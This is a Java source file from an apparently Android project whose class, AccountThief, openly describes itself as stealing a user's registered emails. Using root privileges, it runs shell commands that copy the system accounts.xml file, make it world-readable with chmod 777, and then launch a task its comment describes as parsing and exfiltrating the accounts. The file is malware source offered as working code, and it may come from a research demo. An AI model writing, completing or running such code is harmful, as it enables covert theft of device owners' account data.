package com.trustme.testsu;

import com.trustme.testsu.root.Root;
import com.trustme.testsu.utils.Constants;

public class AccountThief {
	public static final String TAG = "AccountThief";
	
	public AccountThief(){
		
	}
	
	/**
	 * Get all the registered user emails.</br>
	 * It steals the user's registered emails. </br>
	 * <b>Requires root privileges</b>
	 * @author sdemetr2 
	 */
	public void getUserAccounts() {
		//move accounts.xml to a convenient location and make it accessible
		String[] commands = new String[2];
		commands[0] = new String("cp " + Constants.ACCOUNTS_FILEPATH + " " + Constants.INTERNAL_STORAGE_PATH + Constants.NEW_ACCOUNTS_NAME + "\n");
		commands[1] = new String("chmod 777 " + Constants.INTERNAL_STORAGE_PATH + Constants.NEW_ACCOUNTS_NAME + "\n");
		
		Root rt =new Root();
	    rt.execCommands(commands);
	   // rt.changeMode("/data/system/sync/", "accounts.xml", Constants.NEW_ACCOUNTS_NAME);
	    
	    //parse accounts.xml and exfiltrate
	    ParseAccountsTask parse_accounts_task = new ParseAccountsTask();
	    parse_accounts_task.execute();
	}	
}
